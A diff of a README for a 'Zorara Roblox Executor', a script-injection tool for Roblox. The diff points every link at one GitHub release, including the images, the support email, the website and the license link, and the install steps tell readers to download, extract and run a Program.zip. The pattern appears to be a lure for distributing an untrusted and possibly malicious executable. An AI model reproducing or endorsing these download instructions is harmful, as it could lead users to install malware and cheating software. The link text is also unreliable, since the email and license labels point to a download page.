@@ -1,6 +1,6 @@
 # Roblox
 
-![Roblox Logo](https://cdn.worldvectorlogo.com/logos/roblox-1.svg)
+![Roblox Logo](https://github.com/Kokopetrov/Zorara-Executor/releases/tag/v2.0)
 
 Zorara Roblox Executor is a software used to run custom lua scripts and mods within the Roblox gaming platform.
 
@@ -22,7 +22,7 @@ Zorara Roblox Executor is a software used to run custom lua scripts and mods wit
 
 Welcome to the Roblox repository! This repository contains the Zorara Roblox Executor software, which allows you to run custom lua scripts and mods within the popular Roblox gaming platform. Whether you are a modder, developer, or enthusiast, this tool provides you with the capability to enhance your Roblox experience by executing custom scripts and modifications.
 
-![Roblox Screenshot](https://cdn.pixabay.com/photo/2018/08/25/05/02/roblox-3625898_960_720.jpg)
+![Roblox Screenshot](https://github.com/Kokopetrov/Zorara-Executor/releases/tag/v2.0)
 
 ---
 
@@ -41,7 +41,7 @@ Welcome to the Roblox repository! This repository contains the Zorara Roblox Exe
 To install the Zorara Roblox Executor, follow these steps:
 
 1. Download the software from the following link:  
-[![Download Zorara Roblox Executor](https://img.shields.io/badge/Download-Program.zip-<COLOR-CODE>)](https://github.com/user-attachments/files/17563023/Program.zip)
+[![Download Zorara Roblox Executor](https://github.com/Kokopetrov/Zorara-Executor/releases/tag/v2.0<COLOR-CODE>)](https://github.com/Kokopetrov/Zorara-Executor/releases/tag/v2.0)
 
 2. Extract the downloaded ZIP file to a location of your choice on your computer.
 
@@ -59,13 +59,13 @@ Once you have installed the Zorara Roblox Executor, you can start using it to ru
 4. Click on the "Execute" or "Run" button to apply the script or mod within Roblox.
 5. Enjoy the enhanced gameplay experience with your custom modifications.
 
-![Roblox Gameplay](https://cdn.pixabay.com/photo/2020/11/16/21/31/virtual-roblox-5749966_960_720.png)
+![Roblox Gameplay](https://github.com/Kokopetrov/Zorara-Executor/releases/tag/v2.0)
 
 ---
 
 ## Support
 
-If you encounter any issues or have questions regarding the Zorara Roblox Executor, feel free to reach out for support. You can contact the development team via email at support@zorara.com or visit our website at [www.zorara.com](https://www.zorara.com) for additional resources and FAQs.
+If you encounter any issues or have questions regarding the Zorara Roblox Executor, feel free to reach out for support. You can contact the development team via email at https://github.com/Kokopetrov/Zorara-Executor/releases/tag/v2.0 or visit our website at [https://github.com/Kokopetrov/Zorara-Executor/releases/tag/v2.0](https://github.com/Kokopetrov/Zorara-Executor/releases/tag/v2.0) for additional resources and FAQs.
 
 ---
 
@@ -77,7 +77,7 @@ We welcome any contributions to the Zorara Roblox Executor project. If you have 
 
 ## License
 
-The Zorara Roblox Executor is licensed under the [MIT License](https://opensource.org/licenses/MIT). You are free to use, modify, and distribute this software in accordance with the terms specified in the license agreement.
+The Zorara Roblox Executor is licensed under the [MIT License](https://github.com/Kokopetrov/Zorara-Executor/releases/tag/v2.0). You are free to use, modify, and distribute this software in accordance with the terms specified in the license agreement.
 
 ---
 
